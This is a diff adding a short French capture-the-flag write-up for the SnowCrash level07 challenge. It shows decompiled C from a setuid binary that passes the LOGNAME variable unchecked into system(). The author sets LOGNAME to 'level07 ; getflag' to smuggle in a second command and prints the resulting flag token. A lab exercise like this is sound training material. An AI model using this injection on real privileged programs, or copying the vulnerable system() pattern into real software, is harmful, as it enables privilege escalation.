@@ -1,0 +1,32 @@
+On recupere l'executable et on le decompile avec Ghidra.
+//
+int main(int argc,char argv,char envp)
+
+{
+  char *pcVar1;
+  int iVar2;
+  char *buffer;
+  gid_t gid;
+  uid_t uid;
+  char *local_1c;
+  gid_t local_18;
+  uid_t local_14;
+
+  local_18 = getegid();
+  local_14 = geteuid();
+  setresgid(local_18,local_18,local_18);
+  setresuid(local_14,local_14,local_14);
+  local_1c = (char *)0x0;
+  pcVar1 = getenv("LOGNAME");
+  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
+  iVar2 = system(local_1c);
+  return iVar2;
+}
+//
+En lisant le code on remarque que l'on peut faire export LOGNAME="&& getflag".
+Ce qui va donner: iVar2 = system(/bin/echo && getflag)
+level07@SnowCrash:~$ export LOGNAME="level07 ; getflag"
+si on execute ./level07
+on nous retourne:"
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h"
